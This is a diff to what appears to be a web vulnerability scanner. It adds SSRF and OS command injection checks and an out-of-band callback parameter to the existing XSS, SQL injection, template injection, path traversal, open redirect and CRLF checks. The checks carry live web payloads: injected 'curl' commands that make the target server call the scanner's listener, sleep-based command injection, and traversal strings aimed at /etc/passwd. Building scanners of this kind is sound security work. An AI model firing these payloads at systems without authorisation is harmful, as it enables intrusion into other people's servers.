@@ -39,7 +39,7 @@ def _finding(check, point, payload, evidence, confidence, resp):
 class ReflectedXSS:
     key, title, severity = "xss", "Reflected XSS", "high"
 
-    def run(self, point, build, send, baseline, rand):
+    def run(self, point, build, send, baseline, rand, oob=None):
         marker = f"wz{rand}"
         payload = f"{marker}<img src=x onerror=alert(1)>"
         r = send(*build(payload))
@@ -59,7 +59,7 @@ class ReflectedXSS:
 class SqlError:
     key, title, severity = "sqli", "SQL injection (error-based)", "high"
 
-    def run(self, point, build, send, baseline, rand):
+    def run(self, point, build, send, baseline, rand, oob=None):
         base = point.get("value", "")
         if baseline and _SQL_ERRORS.search(baseline.get("text", "")):
             return None   # the page already shows a SQL error without us — not our injection
@@ -76,7 +76,7 @@ class SqlError:
 class Ssti:
     key, title, severity = "ssti", "Server-side template injection", "high"
 
-    def run(self, point, build, send, baseline, rand):
+    def run(self, point, build, send, baseline, rand, oob=None):
         product = "1787569"   # 1337*1337, distinctive
         for expr in ("{{1337*1337}}", "${1337*1337}", "#{1337*1337}", "<%= 1337*1337 %>", "{1337*1337}"):
             r = send(*build(expr))
@@ -90,7 +90,7 @@ class Ssti:
 class PathTraversal:
     key, title, severity = "traversal", "Path traversal", "high"
 
-    def run(self, point, build, send, baseline, rand):
+    def run(self, point, build, send, baseline, rand, oob=None):
         for payload in ("../../../../../../../../etc/passwd", "....//....//....//....//etc/passwd",
                         "..\\..\\..\\..\\..\\..\\windows\\win.ini"):
             r = send(*build(payload))
@@ -105,7 +105,7 @@ class PathTraversal:
 class OpenRedirect:
     key, title, severity = "open-redirect", "Open redirect", "medium"
 
-    def run(self, point, build, send, baseline, rand):
+    def run(self, point, build, send, baseline, rand, oob=None):
         name, val = point["name"].lower(), point.get("value", "")
         if point["loc"] not in ("query", "body-form"):
             return None
@@ -126,7 +126,7 @@ class OpenRedirect:
 class CrlfInjection:
     key, title, severity = "crlf", "CRLF / header injection", "medium"
 
-    def run(self, point, build, send, baseline, rand):
+    def run(self, point, build, send, baseline, rand, oob=None):
         marker = f"wyrm{rand}"
         payload = point.get("value", "") + f"\r\n{marker}: 1"   # raw CRLF; query/form builders url-encode it
         r = send(*build(payload))
@@ -137,4 +137,60 @@ class CrlfInjection:
         return None
 
 
-ALL_CHECKS = [ReflectedXSS(), SqlError(), Ssti(), PathTraversal(), OpenRedirect(), CrlfInjection()]
+class Ssrf:
+    key, title, severity = "ssrf", "Server-side request forgery (SSRF)", "high"
+
+    def run(self, point, build, send, baseline, rand, oob=None):
+        if oob is None:
+            return None
+        token = oob.token()
+        url = oob.url(token)
+        if not url:
+            return None
+        r = None
+        for payload in (url, "//" + url.split("://", 1)[-1]):   # full URL, then scheme-relative
+            r = send(*build(payload)) or r
+        if oob.wait_hit(token, 10):
+            return _finding(self, point, url,
+                            "The server fetched our out-of-band URL — it makes requests to an attacker-controlled "
+                            "host (SSRF).", "firm", r or {})
+        return None
+
+
+class CommandInjection:
+    key, title, severity = "cmdi", "OS command injection", "high"
+
+    def run(self, point, build, send, baseline, rand, oob=None):
+        import time
+        base = point.get("value", "")
+        # 1) out-of-band: inject a shell command that calls our listener (reliable, fast)
+        if oob is not None:
+            token = oob.token()
+            url = oob.url(token)
+            if url:
+                r = None
+                for p in (f"{base};curl {url}", f"{base}|curl {url}", f"{base}&&curl {url}",
+                          f"{base}`curl {url}`", f"{base}$(curl {url})"):
+                    r = send(*build(p)) or r
+                if oob.wait_hit(token, 10):
+                    return _finding(self, point, f"{base};curl {url}",
+                                    "An injected shell command called our out-of-band URL — OS command injection.",
+                                    "firm", r or {})
+        # 2) time-based fallback (no OOB needed): a sleep payload delays the response; confirm with a longer sleep
+        if point.get("loc") not in ("query", "body-form", "json"):   # bound the cost
+            return None
+        for mk in (lambda n: f"{base}; sleep {n}", lambda n: f"{base}$(sleep {n})"):
+            t = time.monotonic()
+            send(*build(mk(4)))
+            if time.monotonic() - t >= 3.5:
+                t2 = time.monotonic()
+                r2 = send(*build(mk(8)))
+                if time.monotonic() - t2 >= 7:   # the longer sleep delayed it too → not just a slow endpoint
+                    return _finding(self, point, mk(8),
+                                    "The response was delayed in step with an injected sleep command — time-based "
+                                    "OS command injection.", "firm", r2 or {})
+        return None
+
+
+ALL_CHECKS = [ReflectedXSS(), SqlError(), Ssti(), PathTraversal(), OpenRedirect(), CrlfInjection(),
+              Ssrf(), CommandInjection()]
